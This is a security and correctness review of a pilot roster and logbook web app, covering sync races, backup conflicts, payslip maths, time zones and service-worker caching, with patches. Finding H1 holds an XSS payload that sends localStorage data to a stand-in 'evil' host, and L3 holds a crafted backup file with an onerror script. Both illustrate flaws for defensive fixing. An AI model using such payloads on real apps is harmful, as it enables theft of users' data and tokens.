# Rotate: static review of index.html JS, sw.js and manifest.json

Scope: `/home/user/Rotate/index.html` (JS at lines 552-2510; data constants skipped), `/home/user/Rotate/sw.js`, `/home/user/Rotate/manifest.json`. No repo files were modified.

Confidence labels:
- **confirmed**: the code path was traced end to end, or the snippet was run in node (payslip, lbUtc, lbNight).
- **plausible**: the logic is wrong, but whether it triggers depends on something not in the repo, such as the exact text layout of the ITA PDF or how `window.claude` db behaves offline.

Line numbers refer to `index.html` unless a finding says otherwise. Patches show old and new code. Where a line is very long, only the unique substring is quoted.

---

## HIGH

### H1. `esc()`/`lbEsc()` do not escape `'`, and the logbook builds single-quoted attributes. This corrupts data (Italian surnames) and allows XSS from an imported logbook file. (confirmed)

- **Where:** line 577 `esc`, line 1167 `lbEsc`. Single-quoted attribute sinks:
  - `lbLine` 1371-1380: `value='"+lbEsc(r.reg)`, `value='"+lbEsc(E.pic||r.pn||"")`, `placeholder='"+(r.fx&&r.fx.pax||0)` (this one is not escaped at all)
  - `lbSimLine` 1197-1202: `value='"+lbEsc(SE.reg||"")`, `placeholder='"+lbEsc(lbSimDef(c.M))`, `<img src='"+r.sig.img+"'` (not escaped)
  - `lbPrevBody`/`lbSet` 1320, 1397, 1402, 1410, 1412: `value='"+lbEsc(S[k])`, including the "Name on signature" field
  - `lbMiss` 1422: `<option value='"+lbEsc(p)` (the PIC datalist)
  - `lbOpt` 1241 inserts `a`, `v`, `t` and `sub` raw. `lbSum` 1394 inserts `A.ac` raw. Both values come from the free-text "Other types" field (`A.more`, through `lbFleet`).

**Scenario 1: data corruption from ordinary input.**
1. The PIC is "D'ANGELO".
2. `lbLine` renders `value='D'ANGELO'`. The HTML parser reads the value as `D` and turns `ANGELO'` into a stray attribute. The input shows "D".
3. The PIC datalist (line 1422) also offers "D". Picking it saves "D" through `lbChg`.

Simulator rows are worse. The `focusout` handler (line 1195) always calls `lbSxSave(t,false)`. For an FSTD type such as `CAE's FFS A330`, tapping into the field and out again saves `CAE`. `lbSoft` (line 1448, `a.value=b.value`) also copies the truncated value into the inputs of rows that are not focused.

**Scenario 2: XSS from an imported file.**
1. A CSV from an old logbook has a "PIC name" column containing `x' autofocus onfocus='fetch("//evil/?"+btoa(localStorage.turni_meta_v1))`.
2. `lbImpRun` stores the value as `pn`. `lbMatch` puts it in `fx.pn`. `lbRows` copies it to `r.pn`.
3. `lbLine` writes it into `value='...'`, and the script runs as soon as "Missing data" is opened.
4. A JSON import has the same path through `PilotName`, `Reference` (reg) and `Pax` (the placeholder is not escaped).
5. The script can read all local data and, on rotate-lab.github.io, use the in-memory Drive token through `gdApi`.

**Fix:**
```js
// line 577
- const esc=s=>String(s).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
+ const esc=s=>String(s).replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
// line 1167
- const lbEsc=s=>String(s==null?"":s).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
+ const lbEsc=s=>String(s==null?"":s).replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
// line 1241
- function lbOpt(a,v,t,on,sub){return"<button class='row nl' data-a='"+a+"' data-v='"+v+"'><span class='bd'><span class='t'>"+t+"</span>"+(sub?"<span class='s'>"+sub+"</span>":"")+"</span>"+lbCk(on)+"</button>"}
+ function lbOpt(a,v,t,on,sub){return"<button class='row nl' data-a='"+lbEsc(a)+"' data-v='"+lbEsc(v)+"'><span class='bd'><span class='t'>"+lbEsc(t)+"</span>"+(sub?"<span class='s'>"+lbEsc(sub)+"</span>":"")+"</span>"+lbCk(on)+"</button>"}
// line 1394 (lbSum)
- if(k=="auto")return[A.ac=="AUTO"?"Type from roster":A.ac,
+ if(k=="auto")return[A.ac=="AUTO"?"Type from roster":lbEsc(A.ac),
// line 1202
- "<div class='lsig'><img src='"+r.sig.img+"' alt=''>
+ "<div class='lsig'><img src='"+lbEsc(r.sig.img)+"' alt=''>
// line 1379
- placeholder='"+(r.fx&&r.fx.pax||0)+"'
+ placeholder='"+lbEsc(r.fx&&r.fx.pax||0)+"'
```
Values in `data-*` attributes come back decoded through `dataset`, so stored values stay raw.

---

### H2. Account sync (`SY`) can overwrite newer data in the cloud with stale local data, and pushes made while busy are dropped (stale overwrite: plausible; dropped pushes: confirmed)

**Where:** `syncInit` 2252-2261, `syncPush` 2242-2247, `syncDirty` 2249.

**Problem 1: stale overwrite.** `SY.col` is set at line 2254, before the first `meta.get()` and before the merge with local data.
1. The app opens on device A, which has stale local data, while the network is down or the db call throws. The `catch` at 2261 leaves `SY.col` set.
2. The pilot makes any edit. `syncDirty` bumps `turni_ts` to now and calls `syncPush`.
3. `SY.h` is empty, so `syncPush` uploads every month document plus `meta`, with `ts` set to now.
4. This replaces newer data pushed by device B. B's next start sees `rts>lts` and pulls A's stale data. B's changes are lost on both devices.

**Problem 2: dropped pushes.** `syncPush` returns immediately when `SY.busy` is set and nothing reschedules it. An edit made while a push is in flight is not synced until the next edit.

**Fix:**
```js
// line 2242
- async function syncPush(){if(!SY.col||SY.busy)return;SY.busy=true;
+ async function syncPush(){if(!SY.col||!SY.ready)return;if(SY.busy){SY.again=true;return}SY.busy=true;SY.again=false;
// line 2247
- SY.busy=false;syncUi()}
+ SY.busy=false;syncUi();if(SY.again)setTimeout(syncPush,500)}
// line 2259 (pull branch)
- render();SY.last=Date.now();syncUi();return}
+ render();SY.ready=true;SY.last=Date.now();syncUi();return}
// lines 2260-2261
-   if(hasLocal||lts){await syncPush()}else syncUi()
-  }catch(e){SY.err=1;syncUi()}}
+   SY.ready=true;if(hasLocal||lts){await syncPush()}else syncUi()
+  }catch(e){SY.err=1;SY.ready=false;syncUi();setTimeout(syncInit,60000)}}
```

**Related (plausible):** line 2256 pulls whenever `!hasLocal`, which only means no roster days. Local profile, logbook entries and signatures (all in meta) are then replaced by an older remote meta even when the local meta is newer. Compare only `rts>lts`, or count meta keys in `hasLocal`.

---

## MEDIUM

### M1. Drive backup: edits made during an upload are marked as backed up, and the "pending" state is lost on reload (confirmed)

**Where:** `gdPush` 2317-2324, `gdDirty` 2325, startup 2300.

**Problem 1: edits during an upload.**
1. `gdPush` takes the `gdJson()` snapshot, then awaits `gdList`, the upload and the deletes. On mobile this takes several seconds.
2. An edit in that window calls `gdDirty`, which sets `GD.pend=true` and schedules another `gdPush` 3 s later.
3. If the first push is still busy, the scheduled push returns `false` and nothing retries it.
4. When the first push finishes, it sets `GD.pend=false`.

The UI then reports "Last backup …" while the latest edit is not on Drive.

**Problem 2: pending state not saved.** `GD.pend` lives only in memory, and `gdKeep` saves only `{t,s}`. If the app is closed with unsaved changes, and auto-backup is skipped because the token expired (`gdDirty` pushes only while `GD.tok` is valid, and that only happens after an interactive grant), the next launch shows no pending state.

**Fix:**
```js
// line 2325
- function gdDirty(){if(!GD.ok||!gdOn())return;GD.pend=true;
+ function gdDirty(){if(!GD.ok||!gdOn())return;GD.seq=(GD.seq||0)+1;GD.pend=true;
// line 2317
- async function gdPush(){if(GD.busy)return false;GD.busy=true;gdUi();let ok=false;try{
+ async function gdPush(){if(GD.busy){GD.again=true;return false}GD.busy=true;GD.again=false;gdUi();let ok=false;const seq=GD.seq||0;try{
// line 2323
- GD.last=Date.now();GD.size=+nf.size||blob.size;GD.pend=false;GD.err=0;gdKeep();ok=true}
+ GD.last=Date.now();GD.size=+nf.size||blob.size;GD.pend=(GD.seq||0)!==seq;GD.err=0;gdKeep();ok=true}
// line 2324
- catch(e){GD.err=1;GD.pend=true}finally{GD.busy=false;gdUi()}return ok}
+ catch(e){GD.err=1;GD.pend=true}finally{GD.busy=false;gdUi();if(GD.pend&&ok&&gdAuto()&&GD.tok&&Date.now()<GD.exp-60000)setTimeout(gdPush,1000)}return ok}
// line 2300: append after the existing try{...}catch(e){}
+ try{if(localStorage.getItem("rot_gd")=="1"&&(+localStorage.getItem("turni_ts")||0)>GD.last)GD.pend=true}catch(e){}
```
In `gdRestore` (line 2350), also set `GD.last=Date.now()` before `gdKeep()`. Otherwise the restore's own `turni_ts` bump shows as pending after the reload.

### M2. Drive auto-backup overwrites a newer backup made by another device (plausible: needs 2 devices on one Google account)

**Where:** `gdPush` 2319-2322.

**Scenario:**
1. Phone and iPad are both connected with auto-backup on.
2. The iPad, holding stale data, makes one small edit.
3. Its `gdPush` uploads its full dataset and deletes every older file, including the phone's newer backup.
4. The phone's changes are now only on the phone. If the phone is later restored, they are lost.

The UI calls this "Sync", so users will rely on it.

**Fix:** remember the `modifiedTime` of the file this device last wrote or restored, and refuse an automatic push when the file on Drive is different.
```js
// line 2316
- function gdKeep(){try{localStorage.setItem("rot_gdl",JSON.stringify({t:GD.last,s:GD.size}))}catch(e){}}
+ function gdKeep(){try{localStorage.setItem("rot_gdl",JSON.stringify({t:GD.last,s:GD.size,r:GD.rmt||""}))}catch(e){}}
// line 2300
- GD.last=+l.t||0;GD.size=+l.s||0
+ GD.last=+l.t||0;GD.size=+l.s||0;GD.rmt=l.r||""
// line 2319
- const old=await gdList(),b="rot"+Date.now(),
+ const old=await gdList();if(!GD.force&&GD.rmt&&old[0]&&old[0].modifiedTime!==GD.rmt){GD.conflict=1;throw new Error("conflict")}const b="rot"+Date.now(),
// line 2323 (success): add  GD.rmt=nf.modifiedTime;GD.conflict=0;GD.force=0;
// gdRestore (2350) and #gdc (2339): add  GD.rmt=f.modifiedTime;
// #gdb manual "Back up" (2342): set GD.force=1 before gdPush(), after confirming with the user when GD.conflict.
```

### M3. Storage-full errors are swallowed: an import reports success but is not saved, and the sync timestamp is still bumped (confirmed)

**Where:** `save`/`saveMeta` 581-583, wrappers 2250-2251, `rsSet` 1561.

**Scenario:** localStorage holds about 5 MB. Over time it fills with the roster, `meta` (signature PNG data URLs at 2x scale, one per signed session, in `lbSim`/`lb`) and the imported old-logbook file (`turni_lbf_v1`).
1. The next PDF import calls `save()`, which throws `QuotaExceededError`. The error is ignored.
2. `ingest` still shows the toast "Roster imported".
3. `syncDirty` sets `turni_ts=now`, so the cloud sync and the Drive backup treat the stale stored data as newest and push it.
4. On reload the imported month is gone.

**Fix:**
```js
// line 581
- function save(){try{localStorage.setItem("turni_v1",JSON.stringify(days))}catch(e){}}
+ function save(){try{localStorage.setItem("turni_v1",JSON.stringify(days));return true}catch(e){toast(tt("Not saved: storage full","Non salvato: memoria piena"),String(e&&e.name||""));return false}}
// line 583
- function saveMeta(o){try{localStorage.setItem("turni_meta_v1",JSON.stringify(o))}catch(e){}try{sysUp()}catch(e){}}
+ function saveMeta(o){let ok=true;try{localStorage.setItem("turni_meta_v1",JSON.stringify(o))}catch(e){ok=false;toast(tt("Not saved: storage full","Non salvato: memoria piena"),String(e&&e.name||""))}try{sysUp()}catch(e){}return ok}
// lines 2250-2251
- const _save=save;save=function(){_save();syncDirty()};
- const _saveMeta=saveMeta;saveMeta=function(o){_saveMeta(o);syncDirty()};
+ const _save=save;save=function(){const r=_save();if(r)syncDirty();return r};
+ const _saveMeta=saveMeta;saveMeta=function(o){const r=_saveMeta(o);if(r)syncDirty();return r};
// line 640 (ingest)
- Object.assign(days,res.days);save();
+ Object.assign(days,res.days);if(!save()){$("#msg").textContent=tt("Not saved: this device's storage is full.","Non salvato: memoria del dispositivo piena.");return 0}
```
Restores have the same gap. `gdRestore` (2349) and `#bki` (2213) call `setItem` several times in a row. If the second call throws, the device keeps the new `days` with the old `meta`, and the "Invalid file" or "Could not sync" message hides the real cause. To fix this, keep the previous values and write them back in the `catch`.

### M4. Payslip: an EBITDAR result below 70% gives a negative profit bonus, and 0% gives the full bonus (confirmed by running `bpCalc` in node)

**Where:** `bpCalc` 1742-1743.

`eb=+I.eb||1` turns 0 into 1. The `eb<=1` branch `(0.15+eb-0.85)*3.333*pb` goes negative below 0.70.

Output for a first officer, MR, 5 steps, `pdr:"12"` (`pb` = 1500):

| eb | bonus | net (no-bonus net 5185.41) |
|---|---|---|
| 1 | 1500 | 6534.57 |
| 0.75 | 250 | 5410.27 |
| **0.5** | **-1000** | **4285.98** |
| **0** | **1500** | **6534.57** |

The negative bonus lowers gross pay. Through `H32=H30-D93` it also raises taxable income.

**Fix:**
```js
- const pb=(COM?(anz<20?2000:2500):(anz<20?1500:1800))*(I.pdr=="6"?.5:1),eb=+I.eb||1;
- const D93=I.pdr=="6"||I.pdr=="12"?(eb<=1?(0.15+eb-0.85)*3.333333*pb:
+ const pb=(COM?(anz<20?2000:2500):(anz<20?1500:1800))*(I.pdr=="6"?.5:1),eb=I.eb===""||I.eb==null||isNaN(+I.eb)?1:+I.eb;
+ const D93=I.pdr=="6"||I.pdr=="12"?(eb<=1?Math.max(0,(0.15+eb-0.85)*3.333333)*pb:
```
The formula pays 50% at 85%. If the "Busta Export" spreadsheet pays nothing below 85%, use `eb<0.85?0:` instead of `Math.max(0,…)`. Check against the sheet.

### M5. The PDF import timestamp marks old PDFs as "confirmed", and a multi-file import can overwrite newer data with an older file (confirmed logic; the effect depends on the files)

**Where:** `ingest` 640, file handler 654, `lbRows` 1231 (`conf=DY.imp>=f.t1`).

`imp` is the time of import, not the date the PDF was generated.

**Scenario 1: planned times marked as actual.**
1. On Oct 28 the pilot saves the November plan, with planned times.
2. On Dec 1 the pilot re-imports that same file. This happens easily, because the import accepts several files and the files keep the same name.
3. Every November flight gets `imp` = Dec 1, which is at least `t1`.
4. The flights are marked "confirmed", and the logbook PDF prints planned block times as if they were actual.

**Scenario 2: older file wins.** With several files selected, the order is `name.localeCompare`, for example "IndividualDutyPlan (1).pdf" before "IndividualDutyPlan.pdf". Whichever file is processed last wins, whether or not it is older.

**Fix:** use the PDF's own creation date, and never replace a day with data from an older PDF.
```js
// line 624 (pdfLines)
- const pdf=await pdfjsLib.getDocument({data:buf}).promise,out=[];
+ const pdf=await pdfjsLib.getDocument({data:buf}).promise,out=[];
+ try{const md=await pdf.getMetadata(),cd=md&&md.info&&md.info.CreationDate,m=cd&&String(cd).match(/D:(\d{4})(\d\d)(\d\d)(\d\d)(\d\d)(\d\d)(?:([Z+-])(\d\d)?'?(\d\d)?)?/);
+  if(m){let t=Date.UTC(+m[1],m[2]-1,+m[3],+m[4],+m[5],+m[6]);if(m[7]=="+"||m[7]=="-")t-=(m[7]=="+"?1:-1)*((+m[8]||0)*60+(+m[9]||0))*6e4;out.gen=t}}catch(e){}
// line 640 (ingest)
- const IT=Date.now();Object.keys(res.days).forEach(k=>{if(res.days[k]&&typeof res.days[k]=="object")res.days[k].imp=IT});
+ const IT=Math.min(Date.now(),(ls&&ls.gen)||Date.now());Object.keys(res.days).forEach(k=>{const o=res.days[k];if(!o||typeof o!="object")return;if(days[k]&&days[k].gen&&days[k].gen>IT){delete res.days[k];return}o.imp=IT;o.gen=IT});
```
This uses a new `gen` field, so existing days, which have no `gen`, are never skipped. If ITA PDFs carry no `CreationDate`, it falls back to the current behaviour.

### M6. Logbook entries are keyed by the UTC date of departure, so a re-import that moves departure across 00:00Z orphans PF/PM, registration, PIC, fuel and pax (plausible)

**Where:** `lbFlights` 1175 (`k: lbDate(t0)…+"|"+fn`). `meta.lb[k]`, recency roles and file matching all use this key.

**Scenario:**
1. A late departure is planned at 23:50Z. The pilot logs PF, registration and fuel.
2. After landing the pilot re-imports the roster, as the app tells them to do (line 1381). The actual off-block is 00:05Z.
3. The key changes from `2026-11-24|AZ 1234` to `2026-11-25|AZ 1234`.
4. The flight shows as incomplete again. The earlier data stays in meta but is never shown or counted, and the PF landing disappears from recency.

**Fix:** use the roster duty date, which is stable, and migrate old keys once.
```js
// line 1175
- out.push({k:lbDate(t0).split("-").reverse().join("-")+"|"+e.fn,fn:e.fn,
+ out.push({k:k+"|"+e.fn,ok:lbDate(t0).split("-").reverse().join("-")+"|"+e.fn,fn:e.fn,
// new helper, called once after load() at line 2266:
+ function lbMigrate(){const m=loadMeta(),L=m.lb||{};let ch=0;try{for(const f of lbFlights()){if(f.sim||f.ok==f.k)continue;if(L[f.ok]&&!L[f.k]){L[f.k]=L[f.ok];delete L[f.ok];ch=1}}}catch(e){}if(ch){m.lb=L;saveMeta(m)}}
```
`lbMigrate` also needs to run after each `ingest`, before `render()`. Apply M6 before M7: with the old UTC-date key, M7 would change the keys of post-midnight sectors and orphan their entries in the same way.

### M7. A sector that departs after local midnight inside the same duty day is dated one day early (plausible: depends on how NetLine lists it)

**Where:** `lbFlights` 1173-1174. The same pattern is in `hNext` 1865, `briefRender` 1973 and `bpAuto` 1769.

Departure is always built from the roster day `d`. Arrival only moves with the `+1` flag.

**Example:** day `2026-11-24` with AZ1 FCO 22:30 → CTA 23:45, then AZ2 CTA 00:40 → FCO 01:55.
- AZ2 gets `t0` = 24 Nov 00:40, about 24 h too early.
- It sorts before AZ1.
- It gets the wrong logbook date, and night is computed for the wrong night.
- `lbPrev`/`lbNext` auto-fill of registration and PIC breaks.
- In `hNext` the duty end is wrong.

**Fix:** keep departures within a day in order.
```js
// line 1170
- for(const k of Object.keys(days).sort()){const D=days[k];if(!D||!D.ev)continue;const[y,m,d]=k.split("-").map(Number);
+ for(const k of Object.keys(days).sort()){const D=days[k];if(!D||!D.ev)continue;const[y,m,d]=k.split("-").map(Number);let pt1=0;
// lines 1173-1174
- const[dh,dm]=e.dep.split(":").map(Number),[ah,am]=e.arr.split(":").map(Number),t0=lbUtc(A[3],y,m,d,dh,dm);
- let t1=lbUtc(B[3],y,m,d+(e.plus?1:0),ah,am);if(t1<=t0)t1+=864e5;
+ const[dh,dm]=e.dep.split(":").map(Number),[ah,am]=e.arr.split(":").map(Number);let t0=lbUtc(A[3],y,m,d,dh,dm);
+ let t1=lbUtc(B[3],y,m,d+(e.plus?1:0),ah,am);if(t1<=t0)t1+=864e5;if(pt1&&t0<pt1){t0+=864e5;t1+=864e5}pt1=t1;
```

### M8. Night time is recomputed minute by minute for every flight on every render (confirmed: measured)

**Where:** `lbNight` 1111, called through `lbRows` → `lbCalc`.

`lbRows` runs:
- inside `lbCtx`, from `homeRender` every 60 s (line 2273, through the Logbook card at 1932)
- from `lbSoft` after every field change (1466, 1482, 1483)
- 2-3 times per `lbPrevBody`
- from `stRender`

In node, 800 long-haul sectors take **180 ms**. On a phone that is several times slower, which shows as UI jank on every keystroke commit. `loadMeta()` also re-parses the whole meta JSON, signatures included, dozens of times per render.

**Fix:** memoize the result.
```js
- function lbNight(A,B,t0,t1){const N=Math.round((t1-t0)/6e4);let n=0;for(let i=0;i<N;i++){const p=lbGc(A,B,(i+.5)/N);if(lbSun(p[0],p[1],t0+(i+.5)*6e4)<LBTH)n++}return n}
+ const lbNC=new Map();function lbNight(A,B,t0,t1){const ck=A[0]+B[0]+t0+"|"+t1+"|"+LBTH;if(lbNC.has(ck))return lbNC.get(ck);const N=Math.round((t1-t0)/6e4);let n=0;for(let i=0;i<N;i++){const p=lbGc(A,B,(i+.5)/N);if(lbSun(p[0],p[1],t0+(i+.5)*6e4)<LBTH)n++}lbNC.set(ck,n);return n}
```

---

## LOW

### L1. The service worker stores any same-origin navigation as `index.html` (confirmed)

**Where:** `sw.js` `networkFirst`, line 39: `if (res.ok) c.put("./index.html", res.clone());`.

`privacy.html` is in the SW scope and is served from the same site; it is probably the OAuth consent-screen privacy link.
1. The user opens `https://rotate-lab.github.io/Rotate/privacy.html` in a browser where the SW is installed.
2. The privacy page replaces the cached app.
3. The next offline launch shows the privacy page instead of the app.

**Fix:**
```js
- if (res.ok) c.put("./index.html", res.clone());
+ const p = new URL(req.url).pathname;
+ if (res.ok && /\/(index\.html)?$/.test(p)) c.put("./index.html", res.clone());
```

### L2. SW stale-while-revalidate: the background update is not kept alive, and opaque or error responses replace good cached copies (plausible)

**Where:** `sw.js` 46-51.

1. The `fetch(...).then(c.put)` after a cache hit is not passed to `e.waitUntil`. The worker can be stopped before the put finishes.
2. `res.type==="opaque"` responses are stored. These come from `<script>` tags without `crossorigin` (pdf.js, pdf-lib) and from the fonts CSS. Each one:
   - overwrites the CORS copy cached at install
   - counts about 7 MB of padded quota in Chrome
   - can be a CDN error page, because the status of an opaque response cannot be read
3. The CORS copy stored at install already serves no-cors requests, so caching opaque responses gains nothing.

**Fix:**
```js
- async function staleWhileRevalidate(req) {
-   const c = await caches.open(CACHE);
-   const hit = await c.match(req);
-   const net = fetch(req).then(res => { if (res && (res.ok || res.type === "opaque")) c.put(req, res.clone()); return res; }).catch(() => null);
-   return hit || (await net) || Response.error();
- }
+ async function staleWhileRevalidate(req, ev) {
+   const c = await caches.open(CACHE);
+   const hit = await c.match(req);
+   const net = fetch(req).then(async res => { if (res && res.ok) { try { await c.put(req, res.clone()); } catch (_) {} } return res; }).catch(() => null);
+   if (hit) { ev.waitUntil(net); return hit; }
+   return (await net) || Response.error();
+ }
// in the fetch handler: staleWhileRevalidate(req)  ->  staleWhileRevalidate(req, e)   (both call sites)
```
`CACHE="rotate-v1.2"` is not tied to `VER`. This is acceptable: the page is network-first, and the libraries have versions in their URLs.

### L3. Day data from a restore or sync goes into `innerHTML` unescaped; a crafted backup file runs script (confirmed for crafted input)

**Where:**
- `pill()` 674-690: `f.fn`, `f.to`, `ci.h`, `D.lay`, `ht.ap`, `g.s`, `g.e`, `sm.s`, `co.h`
- `detail()` 737: `D[k]`
- `nextDuty` 1004: `e.h`
- `lbLine` 1372: `r.dt`

These values are safe from the PDF parser, whose regexes allow only `[A-Z0-9:]`. They are not checked when `days` comes from `#bki` (2213), `gdRestore` (2349) or `syncInit` (2258).

**Example:** a shared "backup" with `{"v":1,"days":"{\"2026-11-01\":{\"date\":\"2026-11-01\",\"ev\":[{\"t\":\"fl\",\"fn\":\"<img src=x onerror=alert(1)>\",\"from\":\"FCO\",\"to\":\"MXP\",\"dep\":\"10:00\",\"arr\":\"11:00\"}]}}"}` runs on the first `render()`.

A day without `ev` also crashes `markLay` and `render()`, which leaves the app blank.

**Fix:** check the data in one place, in `load()`, which every path calls (directly, or after a reload).
```js
- function load(){try{days=JSON.parse(localStorage.getItem("turni_v1")||"{}")}catch(e){days={}}}
+ function load(){try{days=JSON.parse(localStorage.getItem("turni_v1")||"{}")}catch(e){days={}}if(!days||typeof days!="object"||Array.isArray(days))days={};
+  const ok=v=>v==null||/^[\w :+\/!.\-]*$/.test(String(v)),F=["t","fn","from","to","dep","arr","plus","ac","ap","h","s","e","c","hc"];
+  for(const k of Object.keys(days)){const D=days[k];if(!/^\d{4}-\d\d-\d\d$/.test(k)||!D||!Array.isArray(D.ev)){delete days[k];continue}
+   if(!ok(D.lay))delete D.lay;["FT","DT","RT"].forEach(x=>{if(!ok(D[x]))delete D[x]});
+   D.ev=D.ev.filter(e=>e&&typeof e=="object"&&F.every(f=>ok(e[f])))}}
```
Hotel `name`/`tel` are free text and are already escaped through `R()`.

### L4. `rsSet` writes meta directly, bypassing `saveMeta` (confirmed)

**Where:** line 1561.

In-flight rest settings never mark data as changed. They are not pushed to the account sync or to Drive. They can be overwritten by a remote meta on the next `syncInit`, because `turni_ts` is not bumped. Storage errors are also swallowed.
```js
- function rsSet(o){const m=loadMeta();m.rest=Object.assign(rsGet(),o);try{localStorage.setItem("turni_meta_v1",JSON.stringify(m))}catch(e){}}
+ function rsSet(o){const m=loadMeta();m.rest=Object.assign(rsGet(),o);saveMeta(m)}
```

### L5. The Drive "connect" flow silently replaces local logbook data when there is no roster yet (plausible)

**Where:** line 2337: `hasLocal=Object.keys(days).length>0`.

A user with a profile, signed simulator sessions and old-logbook totals in meta, but no roster yet, connects Drive. If a backup exists, `gdRestore(f)` runs without confirmation and replaces all of that.
```js
- const f=await gdFind(),hasLocal=Object.keys(days).length>0;
+ const f=await gdFind(),mt0=loadMeta(),hasLocal=Object.keys(days).length>0||!!(mt0.lb||mt0.lbS||mt0.lbSim||mt0.name||mt0.bp);
```

### L6. Logbook file import edge cases (plausible)

**Problem 1: date format guessed.** `lbImpRun` (line 1305) reads every `n/n/yyyy` date as day/month.
- A US-format CSV (mm/dd/yyyy, the LogTen and ForeFlight default) swaps day and month.
- A day above 12 produces `2026-13-05`, which is silently dropped by `d>today`.
- Totals come out wrong with no warning.

**Fix:** before the loop, scan the column. If any first field is above 12, read day/month. If any second field is above 12, read month/day. Otherwise set `out.warn` to ask the user.

**Problem 2: JSON with no departure time.** In the JSON import (line 1290), `t:m.DepTimeUTC||m.ArrTimeUTC?Date.UTC(...)+m.DepTimeUTC*6e4:""` gives `NaN` when only `ArrTimeUTC` exists. `lbMatch` then never matches the flight, so it is counted twice, once from the file and once from the roster.
```js
- t:m.DepTimeUTC||m.ArrTimeUTC?Date.UTC(y,mo-1,d)+m.DepTimeUTC*6e4:"",
+ t:Number.isFinite(+m.DepTimeUTC)&&(m.DepTimeUTC||m.ArrTimeUTC)?Date.UTC(y,mo-1,d)+(+m.DepTimeUTC)*6e4:"",
```

### L7. The "STRIP" pickup lookup is keyed by day of month only (plausible)

**Where:** `parseLines` 591 and 618, `pdfLines` 628.

For a duty plan whose period spans two months (for example 15 Nov – 14 Dec), `strip[15]` is shared by 15 Nov and 15 Dec. A hotel pickup ("pr") can be added to the wrong day, or one day's pickup can be lost.

**Fix:** keep the weekday token.
- In `pdfLines`, push `"STRIP "+d.s+" "+…`.
- Match with `/^STRIP ((?:Mon|Tue|Wed|Thu|Fri|Sat|Sun)\d{2}) (\S+) (!?\d{4})/` and store `strip[m[1]]`.
- Look up with `strip[["Sun","Mon","Tue","Wed","Thu","Fri","Sat"][new Date(D.date+"T12:00:00Z").getUTCDay()]+D.date.slice(8)]`.

### L8. `hNext` compares a standby or ground-duty end time with the device clock (plausible)

**Where:** line 1872: `+e2.replace(":","")<t.getHours()*100+t.getMinutes()`.

The roster time is local to the airport, but the device may be on layover time. A standby at base that ends at 14:00 Rome stays "next" (or drops early) on a phone set to New York time. `hUtc` already exists for this.
```js
- if(k==tk&&e2&&+e2.replace(":","")<t.getHours()*100+t.getMinutes())continue;
+ if(e2){let eu=null;try{eu=hUtc((sm?sm.ap:g.ap)||loadMeta().base||"FCO",k,e2);if(s&&e2<s)eu+=864e5}catch(x){}if(eu!=null&&eu<now)continue}
```

### L9. The Italian translation observer rewrites user data (confirmed, cosmetic)

**Where:** `trN`/`trT` 2281-2286.

With LANG=it, every new text node is passed through substring replacement with `IT_S`, and whole-text matching with `IT_E`. Hotel names, remarks and PIC names shown as text are rewritten. For example, a hotel "Night Inn" becomes "Notte Inn", and a text node equal to "Rest" becomes "Riposo".

**Fix:** mark containers that hold user data with `data-notr`, and in `trN` add `if(p.closest&&p.closest("[data-notr]"))return;` for text nodes.

### L10. CDN scripts have no Subresource Integrity (hardening)

**Where:**
- lines 13-14: `pdf.min.js`, `pdf-lib.min.js`
- line 1269: `xlsx.full.min.js`, injected at runtime
- line 623: `pdf.worker.min.js`

These scripts run with full access to localStorage and the Drive token.

**Fix:** add `integrity="sha384-…" crossorigin="anonymous"` (and `s.integrity=…;s.crossOrigin="anonymous"` for XLSX). The hashes could not be computed here because the network is blocked. Generate them with `curl -sL URL | openssl dgst -sha384 -binary | openssl base64 -A`.

---

## Checked and found correct

- **`lbUtc`** (1106): the fixed-point iteration gives correct UTC times across the DST gap and overlap and across month and year rollover. Tested: Rome 29 Mar 02:30 → 00:30Z; Rome 25 Oct 02:30 → 01:30Z; NY 30 Nov 23:00 → 1 Dec 04:00Z; Tokyo 31 Dec 23:59 → 14:59Z.
- **`lbSun`/`lbNight`**: give sensible results. FCO→JFK departing 10:00L in December has 0 min of night. JFK 18:00L → FCO 08:00L+1 has 447/480 min. The civil twilight threshold of -6° matches the EASA definition.
- **Recency** (`rcCalc`): the 90-day window, expiry = 3rd most recent TO or LDG + 90 days, and simulator sessions counting as 3+3 are internally consistent.
- **In-flight rest** (`rsCalc`): the rest window, the equal and minimum (2:00 / 1:30) modes and the rounding are consistent. The last shift ends exactly at the window end.
- **IRPEF** monthly brackets (23/33/43 %, 2333.33 / 4166.66) are consistent. The IVO hour bands for LR and MR are continuous.
- **Weather worker** (`WXS`) and NAS data: every value that reaches `innerHTML` (`rawTAF`, `rawOb`, ICAO codes, hazards, NAS `textContent`) goes through `esc`. The manual ICAO override is checked against `/^[A-Z]{4}$/`.
- **Every `target=_blank` link** has `rel="noopener noreferrer"`. `#dpGo` sets `target` from JS, but the anchor already has `rel`.
- **OAuth:** the token is kept in memory only, uses the `drive.appdata` scope, and the feature is limited to the `rotate-lab.github.io` origin. Revoke works when disconnecting.
- **Animation loops:** the `stMap` loop stops when the canvas is detached or hidden. `bgLoop` is cancelled when turned off and skips frames while the page is hidden. The 60 s `homeRender` interval only does work while the Home page is shown, though see M8 for its cost.
- **Unparseable JSON:** `load`, `loadMeta`, `lbFile`, `syncInit` and `gdRestore` all guard `JSON.parse` with `try`/`catch`. `markLay`/`render` still crash on a day without `ev` (fixed by L3).
